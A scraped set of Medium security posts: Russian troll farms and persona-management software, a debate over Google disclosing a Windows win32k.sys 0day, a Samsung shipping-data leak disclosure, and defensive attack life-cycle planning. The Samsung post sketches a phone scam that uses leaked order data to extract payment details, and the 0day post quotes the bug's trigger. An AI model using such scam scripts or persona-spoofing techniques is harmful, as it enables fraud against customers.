Now if we exit out of the “Kali Linux Image” we can now run “docker ps –a” and we now should our image and the associated container. To resume, run “docker attach <container name>”.
To save the current state of a container as an image, you can issue the commit command. When you commit your container, Docker Engine only stores the diff (difference) between the source image and the current state of the container’s image. To list images you already have, run “docker images”
The -p 5555:5555 flag in the command above tells Docker to link port 5555 on the Docker container to port 5555 on the EC Instance.
Written by
","['Docker', 'Security', 'Kali', 'Cybersecurity', 'Ec2']"
Russian Social Media Disruption Report - Tim Boucher - Medium,https://medium.com/@timboucher/russian-manipulation-of-social-media-is-real-f0f46519207a?source=tag_archive---------3-----------------------,"If you’ve participated at all in comments online over the past year, the certainty is near 100% that you’ve seen other people called or have been called yourself, a “troll,” “shill,” or maybe even a <gasp> “Russian.”
Accusations like these are rampant online, as is the paranoia which fosters them, thanks in no small part to a cloud of sensationalist media coverage and our seemingly intrinsic need to find bad guys lurking around every corner…
Showtime’s most recent season of Homeland — season 6, episode 9 (2017) — portrays a shadowy quasi-governmental, private tech startup called the Office of Policy Coordination. Located six floors underground in a nondescript office building outside Washington, DC, the company is found to be responsible for secretly running a massive army of phony sock-puppet accounts across social media, posing as ordinary people in order to advance a nefarious political agenda.
Here’s a two minute clip for reference:
Airing originally in March of this year, the subplot is obviously inspired by events which transpired in cyberspace around the 2016 U.S. presidential election (along with Brexit, and possibly others), where malicious state-sponsored actors allegedly attempted to disrupt the democratic process.
We know the real world analogue of Homeland’s fictional Office of Policy Coordination to be the now infamous Internet Research Agency, or as they’re sometimes called in the media, the ‘Trolls from Olgino.’
Given the confusing, conflicting, and convoluted information out there about this alleged Russian interference, I took it upon myself to do the only logical thing any normal person would do: make a Carrie Mathison-style “crazy wall” inside my shed next to my chicken coop to try and sort it all out.
Okay, sure, it’s not quite as crazy as Carrie’s bipolar-driven Abu Nazir wall, but it’s my first time exteriorizing my own inner crazy wall. So cut me some slack. I had to start somewhere. And I can definitely say: the process was not only extremely useful in developing my understanding, but also oddly very therapeutic.
In the subsequent Homeland episode (s06e10), Carrie’s friend and accomplice Max (Maury Sterling) states: “I’ve heard rumors of social media boiler rooms like this in Russia and in China, but not here. And definitely not on this scale.”
I don’t want to tv-splain too much because I know this is just drama, but based on my research into the subject — using all open source, publicly available information, which I’ve documented with a near religious zeal over the past three weeks — Max’s statement overlooks some important facts which are likely to be known by those working IRL in the security and intelligence fields.
Namely, that in 2010, the U.S. Air Force posted a solicitation to build what amounts to exactly the type of sock-puppet app portrayed in Homeland. Or as they called it on the Federal Business Opportunities website, Persona Management Software (fbo.gov, reproduced on Archive.org, June 2010).
It is, essentially, a social media and propaganda battle-station. From the solicitation:
“Software will allow 10 personas per user, replete with background , history, supporting details, and cyber presences that are technically, culturally and geographacilly [sic] consistent. Individual applications will enable an operator to exercise a number of different online persons from the same workstation and without fear of being discovered by sophisticated adversaries. Personas must be able to appear to originate in nearly any part of the world and can interact through conventional online services and social media platforms. The service includes a user friendly application environment to maximize the user’s situational awareness by displaying real-time local information.”
Through a combination of VPNs, untraceable IPs, and traffic routed through regional proxies, such a service would enable mass identity-spoofing, using persistent personas, each of which has a detailed personal and social media character history for complete verisimilitude.
Well, you tell me — can we? All we can do is try to piece together the � � clues.
Though another company was ultimately awarded the contract (Ntrepid), there was a very relevant document leak by Anonymous from a security contractor called HB Gary Federal in 2011, in which that company’s own vision for such a persona management system was fleshed out in detail.
Quoting from Daily Kos’s 2011 post on the subject, which quotes the HB Gary emails themselves (archived on Wikileaks):
“For this purpose we custom developed either virtual machines or thumb drives for each persona. This allowed the human actor to open a virtual machine or thumb drive with an associated persona and have all the appropriate email accounts, associations, web pages, social media accounts, etc. pre-established and configured with visual cues to remind the actor which persona he/she is using so as not to accidentally cross-contaminate personas during use.” …
“These accounts are maintained and updated automatically through RSS feeds, retweets, and linking together social media commenting between platforms. With a pool of these accounts to choose from, once you have a real name persona you create a Facebook and LinkedIn account using the given name, lock those accounts down and link these accounts to a selected # of previously created social media accounts, automatically pre-aging the real accounts.”
The proposal goes on to describe various “character levels” within their system, based on utility and level of content development:
We can assume with a high degree of certainty, that if such advanced persona management software systems have been under development since at least 2010, that they have very probably advanced somewhat in the seven years which have passed since. To say the least…
Are they at the level of what’s depicted in Homeland’s “Sock Puppets” episode?
Hard to say —without penetrating the secret offices alleged to be using them!
Whether or not our television fantasies here hew close to actual reality — and Americans have been or are currently intentionally manipulated by secret factions in the United States (e.g., the “Deep State”) — a recent report by Freedom House, a US government-sponsored NGO, announced evidence that governments of some 30 countries currently use astro-turfing techniques to manipulate opinion on social media.
For the most part, the operations of these covert cyber troops are said to have a domestic-focus, with the notable exceptions of Russian interference in the 2016 United States presidential election, Brexit, also likely the French and German presidential campaigns, and more recently around the Spanish independence push in Catalonia.
But the story with regards to Russia goes deeper than that…
Much, much deeper.
Over the past several years, operational details from inside the Internet Research Agency have been provided by a series of leaks from former employees, infiltrations by journalists, and break-ins by hacktivists.
Most recently:
“…thousands of young men and women are learning how to be supporters of the ruling United Russia party, future politicians and senior government officials. […]
These young people are taught to open up accounts in all social networks, make as many friends as possible and thus spread information with maximum efficiency,” explained Vasily Yakemenko, founder of the Nashi youth group and head of the Federal Agency for Youth Affairs that runs the camp.”
Though not specifically linked to the IRA, the Nashi youth movement leaks of 2012 (which appeared just before Putin’s challenging but successful 2012 re-election for a controversial third term) provide supplemental evidence of quasi-governmental youth organizations orchestrating prototypical astro-turfing and media manipulation campaigns, as well as pro-government counter-protests. Exactly like the techniques which have been documented above by the IRA, both on and offline, but engaged at the time in embryonic form against Russian mass anti-election fraud protests of 2011–2013 and events in the Ukraine.
We see echoes in BBC reporting from March 2012 of the types of attacks which came to be common place years later during the U.S. presidential election:
“These bots succeeded in blocking the actual message feed with that hashtag,” he wrote.
The rate at which pro-government messages were posted, about 10 per second, suggests they were being done automatically rather than by individuals…”
(See also: IRA support for and infiltration of social movements linked to Calexit, Texas secession, Black Matters, and Native American groups)
Via the above sources, we can determine a few key facts which can be used to track and organize our data.
A leaked IRA employee list (in Russian) is reproduced here for reference (source I believe is Savchuk leak).
Last but not least, as further proof the knowledge and technology to pull off these types of online campaigns is alive and well in Russia, we turn to the case of Moscow Information Technologies, an IT group which supports the Mayor of Moscow.
Anonymous International/Shaltai Boltai also in 2014 leaked some emails between media outlets and government-linked Moscow Information Technologies which worked with Mayor Sobyanin to manipulate public opinion about his administration. Among many other activities, Moscow Times reported in May 2017:
“Sobyanin’s administration heavily invests in swaying the agenda on Yandex.News, Russia’s biggest online news aggregator.   “MIT devised a scheme wherein Moscow’s neighborhood councils (most of them totally loyal to the mayor and to United Russia) set up dozens of similar news websites that are capable of firing off volleys of nearly identical news articles promoting the mayor’s initiatives. This onslaught fools Yandex’s algorithm into thinking that something important is happening. The news aggregator doesn’t differentiate between the sources, and thus assumes there’s a news event that deserves top billing in its ranking system, if hundreds of different outlets are reporting on a single event.”
The tactics described by ex-employees of the Internet Research Agency, combined with other leaks relating to Nashi, and those above by Moscow Information Technologies seem to paint a technical picture which just so happens to mesh handily with fake news endeavors around the world, particularly those famously run out of Macedonia.
The Guardian in July 2017 suggested Robert Mueller was looking into possible ties between these types of fake news sites, to Russian and far-right websites in the United States leading up to the election. Quoting from that article:
“Mattes, a former Senate investigator, did some digging into the sudden phenomenon of eastern European Sanders enthusiasts. He found a spike in activity on the anonymous browsing tool Tor in Macedonia that coincided with the launch of the fake news campaign, which he believes could represent Russian handlers contacting potential east European hosts to help them set up automated websites.”
“He has also found a high degree of apparent coordination in the dissemination of fake news between official Russian propaganda outlets and “alt-right” sites in the US.
“They synchronise so quickly it looks as if they know when a particularly story was going to come out,” he added. “And they all parrot the Kremlin narrative.”
Rolling Stone reporting in November 2017 suggests that Macedonian fake news sites were often sourcing material from U.S. based website Breitbart:
“When I traveled to Macedonia last summer, Borce Pejcev, a computer programmer who has set up dozens of fake-news sites — for around 100 euros each — said it wasn’t quite that simple. Macedonians don’t invent fake news stories, he told me. “No one here knows anything about American politics. They copy and paste from American sites, maybe try to come up with more dramatic headline.” Fox News, TruePundit.com, DailyCaller.com, InfoWars and Breitbart, he said, were among the Macedonians’ most common source material (“Breit-bart was best”).”
Another NY Times article from September 2017 explains how Breitbart’s Stephen Bannon latched onto false news and rumor-mongering out of Twin Falls Idaho, the so-called Fawnbrook incident:
“The Twin Falls story aligned perfectly with the ideology that Stephen Bannon, then the head of Breitbart News, had been developing for years, about the havoc brought on by unchecked immigration and Islamism, all of it backed by big-business interests and establishment politicians. Bannon latched onto the Fawnbrook case and used his influence to expand its reach.”
As reported by The Intercept, November 2016:
“Other conservative content farms, including WorldNetDaily, maintained ties to the Trump election effort. Campaign finance records show that Great America PAC, a Trump-backing Super PAC, paid WND, known as the largest purveyor of Obama birth certificate conspiracy theories, for “online voter contact.”
At the end of the day, whether all of the above are somehow coordinated, or if it’s just a coincidence is a moot point since the end effect is largely the same.
CNN, in September 2017 asked an important question regarding Russia-linked IRA Facebook ad buys targeting Baltimore and Ferguson:
“Senator Mark Warner, the top-ranking Democrat on the Senate Intelligence Committee, said Tuesday that the “million-dollar question” about the Facebook ads centered on how the Russians knew whom to target.”
Speculations are of course rife regarding the nature and connections between the Trump campaign, which was obviously served by disinformation and trolling campaigns, and agents of the Russian government. Did the Russians know which voters in which states to concentrate their efforts on? And if so, how exactly did they get this data? (And at the end of the day, does anybody even really care?)
Though the link is for now tenuous, one avenue of official investigation has gone after the potential role of big data company, Cambridge Analytica, which first worked on Ted Cruz’s campaign, later on Trump’s, and which may or may not have worked on Brexit. Incidentally, Breitbart’s Bannon was at one time VP of Cambridge Analytica, and held between a $1 and $5M stake in the company.
Here’s a video with a bit more info about CA’s methodology of micro-targeting individual voters based on psychological profile and tailoring campaign messaging directly to them:
Other likely suspects within the Trump administration appear to be, variously, Jared Kushner and Brad Parscale who worked on the data operation for the campaign. As well as Michael Flynn, who worked in a brief advisory role for Cambridge Analytica.
(See also: Correct the Record, Hillary PAC which used astro-turfing techniques)
Of course, the Russians may not have needed any outside help when it comes to monitoring internet activity. Since 2011, the Russian government has cracked-down hard on internet freedoms. For starters, all ISPs in Russia are required by the government to run a system called SORM (Wikipedia) which the Federal Security Service can use to access web traffic:
“It allow[s] the agency to unilaterally monitor users’ communications metadata and content, including phone calls, email traffic and web browsing activity. […] In 2014, the system was expanded to include social media platforms…”
Though it is mysteriously unavailable at the time of this writing, we also have an interesting solicitation by the Russian government from 2014 for monitoring software partly entitled (auto-translation), “automatic selection of media information, studying the information field, monitoring blogs and social media.”
On this, iz.ru published in January 2014 a description:
“Information materials will be preliminarily processed, they will be grouped on specific topics: the president, the administration of the president’s administration, the prime minister, opposition protests, governors, negative events in the country, incidents, criticism of the authorities.”
Facebook just announced that by the end of the year, they will offer a tool for users to see if they liked or followed accounts or pages linked to the Internet Research Agency. According to their written testimony before the Senate Select Intelligence Committee and an official blog post, Facebook said they have identified and suspended 470 accounts or pages. Twitter testified as to having identified and suspended with the help of third-party information some 2,752 accounts (full list).
Without having access the technical data which those platforms must have, we can speculate with a high degree of probability what signals and indicators Facebook, Twitter and Google must be able to use to identify potential malicious state-sponsored accounts:
The best conclusion I think we could draw from this investigation is one I’ll borrow from Kester Ratcliff’s article on open source intelligence for beginners:
“The internet will continue to be a confusing information-psychological warzone until the networked-ness of information is made visible so that people can easily and instantly see where stuff’s coming from and who/ what it’s associated with and what effects their interacting with it may have.”
Strictly speaking, this isn’t a “Russia issue” at all. Any malicious actor could weaponize these vectors. It’s an information issue. And it’s here to stay until we do something about the entire system, not just the symptoms.
Until then, I’ll keep working on my crazy wall.
I have a feeling we’re going to need it…
Written by
","['Anonymous International', 'Evgeny Prigozhin', 'under sanction', 'Nashi', 'Camp Seliger', 'Currency', 'meme warfare', 'News', 'Social Media', 'Politics', 'Russian', 'Cybersecurity']"
Safer Already - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/safer-already-4928a5af8c11?source=tag_archive---------5-----------------------,"The various sects in the disclosure religious wars are having a bit of a squabble right now. Google’s security team captured a couple of 0day exploits being actively used in the wild. On October 21st, they informed the vendors, one of whom (Adobe) was able to release a patch in days, the other (Microsoft) was planning on rolling their patch out on Nov 8th (Patch Tuesday.) On Halloween, Google publicly released details about the exploits, or as we say in the biz — “dropped 0day.”
After a couple days, sufficient details have emerged that we can piece together what was actually going on behind all those “exploits being actively exploited in the wild” and other opaque statements.
The Google post on October 31st was vague on the targeting and threat posed by the attackers, but detailed on the specifics of the exploit vector and mechanism.
we are today disclosing the existence of a …critical vulnerability in Windows for which no advisory or fix has yet been released. This vulnerability is particularly serious because we know it is being actively exploited.
Here are the details on the exploit:
The Windows vulnerability is a local privilege escalation in the Windows kernel that can be used as a security sandbox escape. It can be triggered via the win32k.sys system call NtSetWindowLongPtr() for the index GWLP_ID on a window handle with GWL_STYLE set to WS_CHILD.
That should be enough to get it reengineered and into Metasploit before the patch is officially released. Everyone in infosec knows and loves/hates win32k.sys, the Microsoft kernel module which provides an unending stream of exploitable bugs.
This sounds like a pretty terrifying and scary thing when an exploit for which there is no remediation (win32k.sys is required for Windows to function), and no patch, is being actively exploited in the wild. But, it really matters a great deal who is doing the exploiting and who they are targeting.
The GRU was conducting a spearphishing campaign (which means essentially, sending exploits via email attachments to targeted individuals.) This exploit bundle was probably an Office document with an embedded Flash object to get code execution, a win32k.sys local to migrate into the kernel, and then probably some malware payload for persistence. I suspect that some of the targeted users were using GMail accounts, and Google scanning and analysis of emails discovered these malicious attachments. The attribution to GRU was possibly done via the post exploitation malware payload.
Google’s security team do their in depth analysis and inform the vendors on the 21st. Adobe has an easy time rolling out a patch via their automated patch channels. Microsoft has a scheduled patch roll out scheduled in three weeks, and given the limited nature of the threat (local privilege escalation exploit; targeted attacks by GRU using email) they decide not to do an “out of band” patch. Microsoft’s huge fear is “wormable vulnerabilities,” (Remote Code Execution for the rest of us.) This vulnerability is not “wormable” (i.e. not RCE) so it would not be a CODE RED!!! level issue.
And then Google dropped the 0day.
The threat actor using the 0day bundle (Flash + win32k.sys) was a nation state intelligence service targeting nation state targets. Known variously as STRONTIUM, Sofacy, APT28, and ${Something} Bear, the group is (probably) the Russian military intelligence agency GRU (now known as GU, as if there weren’t enough confusing names already!).
Recently, the activity group that Microsoft Threat Intelligence calls STRONTIUM conducted a low-volume spear-phishing campaign — Source
Were you at risk of this attack from Russian military intelligence?
STRONTIUM is an activity group that usually targets government agencies, diplomatic institutions, and military organizations, as well as affiliated private sector organizations such as defense contractors and public policy research institutes [Emphasis added]— Source
NO.
Unless you are in any of the above categories, then the answer is, almost certainly, “no.” If you are in the above categories, you should be aware and vigilant against attacks because intelligence agencies are not going to stop doing their job simply because some of their exploits were disclosed.
However, the problem now is that this vulnerability is no longer restricted to just Russian military intelligence — it is available to every single threat actor. This radically changes the threat assessment calculus. It is no longer simply a risk for targets of the GRU, but for everyone that could be targeted by any threat actor (including cyber criminals, other nation states, etc.) From a small pool of at risk individuals (GRU targets) the at risk population has now expanded to include everyone.
The answer depends on your religious convictions about disclosure.
Some might suggest that this assessment overestimates the likelihood of reengineering and reusing the exploit in time, and underestimates the positive longterm aspects of this type of disclosure.
Personally, I think waiting an additional few days to allow Microsoft to roll out their scheduled patch wouldn’t have increased the potential risk significantly, not compared to the increased risk of having an 0day on the loose for a week. I don’t subscribe to the “tell other people what to do with their information” school of thought, so Google was absolutely within their rights to drop 0day.
UPDATE [2016–11–08]: I got the prediction wrong on Metasploit module before Patch Tuesday, probably because there was no compelling reason to rush out Yet Another WiN32.Sys (YAWNS) exploit into a public framework. However I believe my main point is still valid.
More interesting is this data:
The buggy code was available in the win2k source code leak. This code has been available in the wild for a long time (years) and I guess the win32k.sys vulnerability was exploitable even in win2k. That’s a decade or so of vulnerability with the source code available to any to review and find the bug. Source code access does not mean that bugs are found and fixed any sooner, is the only logical conclusion.
Written by
","['Cybersecurity', 'Security', 'Information Security', 'Operational Security']"
Samsung Leaking Customer Information - HackerNoon.com - Medium,https://medium.com/hackernoon/samsung-leaking-customer-information-9b7e2dcb006d?source=tag_archive---------1-----------------------,"About four months ago, I ordered a new TV directly from Samsung’s online store. A few days later, I received a tracking link via email.
When I first received the link, it showed an order that wasn’t my own. I assumed there was some sort of clerical error, but I was too busy at the time to contact Samsung about it. When I checked back later in the day, there were now two orders showing at the link Samsung sent me — my own, and the other order.
I was a little concerned by the fact that my tracking number showed two orders, so I contacted Samsung to find out what was going on. I received the following reply.
I understand you are concerned with your tracking. AGS recycles their tracking numbers every year which is why you see more than one orders under the same tracking number. Your tracking has been updated and is the first listed. We apologize for any inconveniences that may have impacted your experience with Samsung. We at Samsung appreciate your business, and we sincerely hope that this situation doesn’t deter you from continuing to purchase products of the Samsung brand. If you have any other questions or concerns please email me back.
This already seemed a bit odd — Samsung is telling me not to worry about this, their shipper just happens to reuse tracking numbers annually. These orders were clearly shipped days apart.
When I clicked one of the HAWB (House Airway Bill) links, it took me to the tracking details for my own order.
This is indeed my order . A 60"" SAMSUNG TV shipping to Orchard Park, NY, POD (Proof Of Delivery) Metzger. It even has my order number from the Samsung website (11109231971). That seems like an awful lot of information to expose to an unauthenticated user.
Wait a minute… weren’t there two links on that page? I went back to the page (which Samsung sent me a link to) and clicked the other HAWB link. Now I’m looking at all of the same order information for someone else’s order. (I’m a little jealous, they ordered a bigger TV.)
If Samsung sent me a link to view someone else’s order, then surely that guy can also see my order.
This was already rather disappointing. All someone needs is the tracking URL that Samsung sent me, and they can see a lot of my order details (and someone else’s order details).
In some cases, applications use secret URLs for sensitive functions (ie. password reset URLs delivered via email.) This is not one of those cases. My tracking URL was surely delivered to someone else with the same ID — it has already lost any notion of secrecy.
Even if someone else hadn’t received the same tracking URL, this link still cannot be considered secret. Notice the only special part about the link is a relatively low integer (1138977). That, coupled with the fact that Samsung told me that the shipper “recycles their tracking numbers every year” makes it obvious that these IDs are sequentially assigned.
All it takes is knowledge of one tracking URL and you can walk through all of the tracking IDs sequentially. With about five minutes of scripting, someone could scrape the data of every Samsung shipment, yielding:
Let’s think about how dangerous it is just to leak these four pieces of information to someone with malicious intent. Since we have a last name and city, a quick internet search would yield possible phone numbers for the orderer.
Once we have a list of potential phone numbers, we put on our social engineering hat and call each one.
If they say they didn’t order anything, hang up and move on to the next phone number. If it sounds like like they know what we’re talking about, give a little more information so they know this call is legit.
We have our foot in the door and we’ve made it clear that we are legitimately calling from Samsung (surely a scammer wouldn’t know their order number and what they ordered?)
It’s time to exploit this trust and extract payment details with an offer that can’t be passed up.
You get the idea — it’s seriously easy to turn these four pieces of information into a rather convincing social engineering attack.
After my TV was delivered, I went back to check the tracking status — hoping that this was just a ephemeral leak while the shipment was en route, disappearing after I received the delivery.
I found the exact opposite. Not only was the order information still there — but now there was a link to a TIFF file too.
That TIFF file turned out to be a scanned copy of the signed waybill for the delivery.
They were already leaking enough information for a social engineering attack — now they’re leaking even more pieces.
All of this information was obtained directly from a link that Samsung sent to me— but you don’t have to buy something from Samsung to find a link to the tracking system. It turns out Google has already indexed some queries for airway bills.
Even if the shipping company gets these removed from Google, it’s still not too difficult to find these items. They have a form to search for tracking numbers.
The form makes it obvious this should be a seven digit number. Starting with 0000001 takes us to familiar search results:
At this point, there is no question about it — information in this system is not secret. Links are sent directly to consumers, links are indexed in google, and there is an open form on the website for performing searches.
I didn’t like the fact that all of this information was freely available to anyone willing to spend a couple minutes to scrape data, so I responded back to Samsung again. I informed them that my personal information was being shared via their shipper’s website. I included descriptions of each piece of information, with direct links to it. I also informed them that the data was easily enumerable because it uses sequential IDs — and I requested that they loop in their information security team.
Two weeks later, I received a response from Samsung:
I understand you would like this forward to our security team. Your request will need to be taken up with AGS. You will need to remove your information through AGS. We apologize for any inconveniences that may have impacted your experience with Samsung. We at Samsung appreciate your business, and we sincerely hope that this situation doesn’t deter you from continuing to purchase products of the Samsung brand.
That’s it. Samsung says I need to take it up with their shipper.
That is not going to happen. I entrusted Samsung with my data, and that is who I hold solely responsible for safeguarding it. If Samsung’s business partner is leaking that information, Samsung needs to remedy the situation.
As I was writing this up, I was going to redact some of my information (or at least my wife’s signature) but it wouldn’t make much of a difference. Four months after I disclosed this to Samsung, the information is still there for anyone to retrieve. Please don’t try to sell me a warranty for my tv.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
","['About', 'Help', 'Go Home', 'Security', 'Samsung', 'Privacy', 'Information Security', 'Cybersecurity']"
Scenario Planning with Attack Life Cycle - Jym - Medium,https://medium.com/@jym/scenario-planning-with-attack-life-cycle-6c8aadba4412?source=tag_archive---------4-----------------------,"How can we use Attack Life-Cycle for better defense?
Before we go into any details, let’s talk about strategies. Sorry for being corny but every warfare (regardless cyber or kinetic) discussions will require some Sun Tzu quotations so I might as well add two which are self-explanatory. I’ll throw in a Bruce Schneier too:
Only amateurs attack machines; professionals target people
If a machine can be trained to defeat a top human Go player, why not some machine learning techniques for security? We don’t look at just the machines but also the people. We should be specifically concerned with sudden changes in behaviors.
For the 2nd strategic point, there are many good digital forensics materials & technical attack research write-ups online, we should use such information for threat hunting & detection enhancements.
Instead of hammering production networks, we should be using Cyber Ranges. Some folks have the idea that a Cyber Range exists as a few switches & firewalls wired to Network Traffic Generators just for network simulations/exercises. Network layer is important but it is not the only attack surface. Host layer is equally important. I chanced upon a debrief for US National Collegiate Cyber Defense Competition and looking at “10 years later and I still have this slide” makes me wonder how would such competitions translate to better defense. So how then to use a Cyber Range?
That Venn diagram depicts the necessary and sufficient conditions for a successful attack as spelled out in the 3-tenets model of Cyber Security. We also need to factor in the end-users business use-cases & workload in our planning. It is important because what’s the point of having locked-down but unusable systems?
The monitoring team typically relies on 1 of the four type of controls. They may take into account of logs from the other controls along with various audit logs but SOC is not responsible for implementation of the networks, endpoint hosts and other security controls, it is usually done by some deployment teams &/or vendors. If the detection is weak, we will have no idea of what to correct. You don’t know what you don’t know.
For some strange reason, the attackers can somehow figure out the terrain better than those poor fellows who are tasked to look after something they don’t know much. Defenders have to plan and test scenarios according to the stakeholders’ infrastructure, business context & threat modelling & execute exercises that lead to collaboration and concrete learning outcomes that can drive improvements.
You may be thinking ‘Cyber Range is not cheap…& we don’t have enough people…’ but fortunately, there are start-ups like SimSpace that will bring their years of experience from academia & military projects to the market, making CR available to enterprises. As for the people, suppose you can hire/re-purpose a bunch of people, what are you going to do to make sure they are competent?
Stake-holders, Security Engineering, Red-team, Monitoring & Threat (malware, DFIR…) specialists need to get together & collaborate. Some call it purple (blue + red) teaming. Whatever we want to call it, the game is evasive-attack techniques vs security controls. Security engineering should not be reduced to product ‘peddling’, installation, troubleshooting & get into blame games. We should be asking how cost-effective are these controls and how high a bar we are going to level up to make life difficult for the red-teamer/attacker.
This is an not even an exhaustive list of techniques but one can see that the attacker/red-team has a repeatable playbook & tools to use create problems but how about the Blue-team?
This is a just a list of sample controls. There’s a saying The attacker only needs to get it right once but we have to get it right all there time. It also quite clear that the defenders have to deal with many different types assets & controls. The learning curve significantly higher compared to let’s say the pen-tester folks who can swear by free Metasploit, plenty of Youtube hacking tutorials & opensource tools. That’s one end of the spectrum for companies that actually bother to invest in security products.
At the other end of the spectrum, there are also some companies still depending their lives on anti-virus for endpoints & firewalls. Those companies with the minimal controls are most likely have networks so badly designed & managed that Advance techniques are NOT required to get the job done, as rightly shared by NSA TAO chief Rob Joyce.
Think about it, for every time a new piece of attack technique info/tools goes public, who will be the first to try it out? It’s usually the criminals, red-teamers & pen-testers. These folks perceive such details as valuable, as part of their rice bowl; there’s direct ROI to try it out. And we have HD Moore’s Law
Casual Attacker power grows at the rate of Metasploit
How many security engineers actually take the extra step to use the new information and figure out a mitigation? Most likely few or none. It is relatively easier to click a button to scan, show an automated report that vulnerabilities exists or ‘hack’ a few boxes to print another few thousand pages report to show pen-test job done.
Fixing thing is a lot harder than breaking things, just like sex is a lot more fun than cleaning up babies’ poop.
We need to change.
First thing first know ourselves with an offensive mindset and know our adversaries’ capabilities. As concisely spelled out by the 3-tenets model, we need to be concerned with Threat Capability in terms of Tools, Techniques & Resources. Security Intelligence is not about having more ‘bad’ feeds to send into your SIEM to get more alerts but really to know, think and act like the threat actor so as to be ready with counter-measures.
The ALC that was shared in my earlier entry is redrawn into a table format. A threat matrix may cover intentional/malicious & unintentional but I want to focus on differentiating external vs internal actors as seen in the earlier slide. The general idea is layout what can the adversary do in the various tactical attack stages with the given asset types.
In the military/kinetic world there are Early Warning/Detection Systems for detecting long-range missiles or Tsunami. It is more challenging with ICT systems. The nearest thing to a kinetic attack in digital space is a DDoS. When a DDoS hits, the systems will typically receive the full blunt of raging packets in an instant. Persistent and stealthy attacks are harder to catch.
Suppose we can get high quality intelligence report of actors’ MO such that we have clear indicators of what hosts & techniques they are using to perform reconnaissance, how they delivery payloads, how they move around internally, then there’s a chance to get the earliest warning at Stage 1 when external actors start to probe the networks.
But suppose we don’t have such intelligence, then in theory, we can spot-and-stop them early at best at Stage 2. Unfortunately in practice, there are lots of obstacles to reliable detection. For instance, lack of application control, BYOD, bad privilege-user hygiene and so on which I will cover in the next entry.
For Stage 3 & 4, I believe the main challenge is differentiating between external & internal threats. The key difference between external vs internal actor is that external one would need to operate with some compromised hosts or introduce a foreign device into the network to get things done from the outside.
Let’s start off with external attack scenario:
Phishing is a popular and effective targeted approach to get into any organization. There are a few ways to present a scenario. For instance, I had some inspiration from Critical Start Consultancy with their nice Threat Kill Chain with Example Controls diagram but we need to also capture some key steps that are taken by the ‘victims’. So I believe a ‘swim lane’ vs stage approach to make it easier to document & for reader to follow. The high-level enumerated steps shown earlier outlines the Procedure within the Tactics, Techniques & Procedures. The details of techniques can be further elaborated in another table:
While John McAfee (founder of McAfee Anti-Virus) was on the run, online magazine Vice publicized a photo of him that contained EXIF metadata that contained his geo-location. An email also has metadata that you would hardly know or see:
The email header is an example of specific learning outcome (eliminate/reduce information disclosure) instead of babbling generic/high-level statements. As you can see from the screenshot above, there are many useful information for the attacker to use. You can have more columns for the scenario details. For instance, a column for mitigation/improvements, further references to the offensive techniques and so on. Which leads to the next set of tactics that is a MUST in order to carry out an attack that is controlled externally…
To do something with a computer, it will require instructions or codes which can be compiled or interpreted. Of course there are layers of Graphical User Interface and so on but fundamentally, bad actors cannot escape the ‘physics’ of running codes to get the device to do something.
It has to be delivered somehow to the target machine. It can run off a series predefined steps as with a RansomWare that encrypts your precious data and coerce you for a fee. It could also be a small Remote Access Tool aka Backdoor that lets an attacker gain remote access & control to the machine. Collectively, we call them malware (malicious software).
We need to touch on the topic of “beyond Anti-Virus” and highlight that it is insufficient as an endpoint control. One way is to perform before-&-after scenario tests of various endpoint protections like application white-listing together with anti-exploitation or containment endpoint products which we will elaborate later.
This scenario is all too common for publicly exposed services. The main point is not really about the means of intrusion but rather, attacks can jump in a non-linear/sequential fashion.
It is not surprising that the first two Critical Security Controls had always been ‘Inventory of Authorized and Unauthorized Devices’ and ‘Inventory of Authorized and Unauthorized Software’. But why? Because Sun Tzu said so? In the context of 3-tenet model, System Susceptibility & Threat Accessibility are the two areas that the defenders can do something about. We can do little about Threat Capabilities except for keeping up in terms of the TTPs & counter-measures.
So why endpoints (non-Microsoft platforms too)? They are the gold-mines for the adversaries. The ‘in-thing’ being hospitals and law-firms while banks are targets for the longest time. Your network devices are usually harder to take over but endpoints (regardless Windows, OSX, Android & iOS), that’s a huge population/attack surface due to the immense functionalities within these devices! Even tactics like taking over privilege user credentials are just means to an end, which translate to impacts related to Confidentiality, Integrity, Availability & Safety.
Depending on the size of your network, the client zone can be in the order of thousands of machines, as such effort and $$$ become a big thing. For Windows, I strongly suggest to start off with free tools like Microsoft System Internals Sysmon. Use it and become proficient with endpoint monitoring before going on to paid tools to compare and really compare the capabilities objectively.
Such event data can be sent to the back-end to analyze. From the screenshot, you can see that I was up to something naughty; escalating privilege but this could have been an attacker within your network. You may say ‘hey I have freaking a few hundred users on my network, how on earth am I going to monitor all of them?’ Well a few ways, in this case of privilege escalation, we should control the client zone such that privilege account usage on endpoints is kept to zero or minimal such that such events are very obvious. But what if we can’t?
We may want to evaluate some of these ‘next generation’ of endpoint & user behavior ‘analytics’. In general, there will be some form of ‘learning’ phase and the main concern is false-positive rates. For instance, how would the machine know if there were attacks during the learning phase? So instead of using analytics to say that is ‘bad’, how about spotting chain of events that deviates from the usual user behavior. The product should consolidate the timeline of events that it deemed as ‘anomaly’ so as to save the analyst from manually connecting the ‘dots’.
For example, the machine learnt that user A is a non-technical user from all the data it collects from all the user’s machine, suddenly we are seeing a command prompt process in privilege mode running automated sequences of commands. Or we may take inputs from HR system that a user is already serving notice of resignation and alert on spikes of SharePoint access and outbound email activities. So these are the kinds of scenarios that we hope analytics can surface instead of just using hard-coded rules as with SIEM.
With the ability to capture executed processes and other relevant data points on endpoints, we can make use of existing forensic knowledge-base to pin-point attacks more accurately. By inconsistency, I mean looking out for signs of deception eg. “top 2016 tech salaries.pdf <insert many space characters>.exe” and the likes. By saying ‘generalize anomalies…’, It means avoid hard-coded rules to only detect one specific file extension but make it more flexible with all the known/or-in-use document formats and executable extensions as with the earlier fake PDF example. Now that we covered endpoints, let’s look at networks.
I am not really a network person, so this section will be really brief. The key thing about network is the design. I think of networks as roads, if we designed it badly, we are going to be screwed for a long time. But unlike roads, how to make a network difficult to get in for the adversary, difficult to poke around, difficult to in-between (Man-In-The-Middle attacks) and difficult to get out, but really easy to setup and maintain? You may want to look at products that implement Host Identity Protocol. Again I need to highlight that having Network Access Control makes it difficult to plug in a foreign device and hopefully increase the difficulty to MITM but it does not mean a compromised host cannot be used to do damage. That’s the reason why I more for securing the Endpoints FIRST.
